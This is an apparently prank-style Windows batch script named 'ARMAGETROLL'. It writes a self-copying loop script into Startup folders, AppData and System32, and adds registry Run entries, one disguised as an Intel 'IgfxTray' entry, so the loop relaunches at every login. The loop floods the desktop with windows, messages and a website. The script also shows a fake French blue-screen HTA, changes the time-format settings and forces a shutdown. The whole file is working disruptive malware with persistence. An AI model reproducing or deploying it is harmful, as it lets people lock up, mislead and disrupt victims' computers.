@echo off
:: YOLO v4 - ARMAGETROLL
set troll=%random%%random%.bat
cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
echo @echo off > %troll%
echo setlocal ENABLEDELAYEDEXPANSION >> %troll%
echo set troll=%%random%%%%random%%.bat >> %troll%
echo set lol=0 >> %troll%
echo :pwn >> %troll%
echo set /a lol=%%lol%%+1 >> %troll%
echo set /a variable=%%lol%% %%%%2 >> %troll%
echo if !variable! EQU 0 (color eb) else (color be) >> %troll%
echo start http://imswinging.com/ >> %troll%
echo start notepad.exe >> %troll%
echo msg * NORAJ! >> %troll%
echo start mspaint.exe >> %troll%
echo start explorer.exe >> %troll%
echo start cmd.exe >> %troll%
echo copy %%0 "%%appdata%%\%%troll%%.bat" >> %troll%
echo copy %%0 "%%windir%%\System32\%%troll%%.bat" >> %troll%
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v YourOwnLifeOrganizer /t REG_SZ /d "%%appdata%%\%%troll%%.bat" >> %troll%
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /f /v IgfxTray /t REG_SZ /d "%%windir%%\System32\%%troll%%.bat" >> %troll%
echo copy %%0 "%%appdata%%\Microsoft\Windows\Start Menu\Programs\Startup\%%troll%%.bat" >> %troll%
echo copy %%0 "%%allusersprofile%%\Microsoft\Windows\Start Menu\Programs\Startup\%%troll%%.bat" >> %troll%
echo start "%%appdata%%\Microsoft\Windows\Start Menu\Programs\Startup\%%troll%%.bat" >> %troll%
echo start "%%allusersprofile%%\Microsoft\Windows\Start Menu\Programs\Startup\%%troll%%.bat" >> %troll%
echo GOTO pwn >> %troll%

echo ^<html^>^<head^>^<title^>BSOD^</title^> > bsod.hta
echo. >> bsod.hta
echo ^<hta:application >> bsod.hta
echo applicationname="BSOD"  >> bsod.hta
echo version="1.0" >> bsod.hta
echo maximizebutton="no" >> bsod.hta
echo minimizebutton="no" >> bsod.hta
echo sysmenu="no" >> bsod.hta
echo Caption="no" >> bsod.hta
echo windowstate="maximize"/^> >> bsod.hta
echo. >> bsod.hta
echo ^</head^>^<body bgcolor="#000088" scroll="no"^> >> bsod.hta
echo ^<font face="Lucida Console" size="4" color="#FFFFFF"^> >> bsod.hta
echo ^<p^>Un probleme a ete detecte et Windows a ete arrete afin de prevenir tout dommage sur votre ordinateur.^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>DRIVER_IRQ_NOT_LESS_OR_EQUAL^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>Si vous voyez cet ecran d'erreur d'arret pour la premiere fois, redemarrez votre ordinateur. Si cet ecran apparait encore, suivez ces etapes:^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>Recherchez tout virus sur votre ordinateur. Supprimez tout disque dur ou controleur de disque dur nouvellement installe. verifiez votre disque dur afin de vous assurer qu'il est correctement configure et termine.^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>Executez CHKDSK/F pour verifier la presence d'un dommage sur votre disque dur puis redemarrez votre ordinateur.^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>Informations techiques:^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>*** STOP: 0x000000D1 (0x0000000C,0x00000002,0x00000000,0xF86B5A89)^</p^> >> bsod.hta
echo. >> bsod.hta
echo. >> bsod.hta
echo ^<p^>***       gv3.sys - Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>Beginning dump of physical memory^</p^> >> bsod.hta
echo ^<p^>Physical memory dump complete.^</p^> >> bsod.hta
echo ^<p^>Contact your system administrator or technical support group for further assistance.^</p^> >> bsod.hta
echo. >> bsod.hta
echo. >> bsod.hta
echo ^</font^> >> bsod.hta
echo ^</body^>^</html^> >> bsod.hta
start "" "bsod.hta"
reg add "HKCU\Control Panel\international" /v s1159 /t REG_SZ /d "YOLO BatchMan" /f
reg add "HKCU\Control Panel\international" /v s2359 /t REG_SZ /d "YOLO BatchMan" /f
reg add "HKCU\Control Panel\international" /v sTimeFormat /t REG_SZ /d "HH:mm tt" /f
timeout 5 >nul
shutdown /p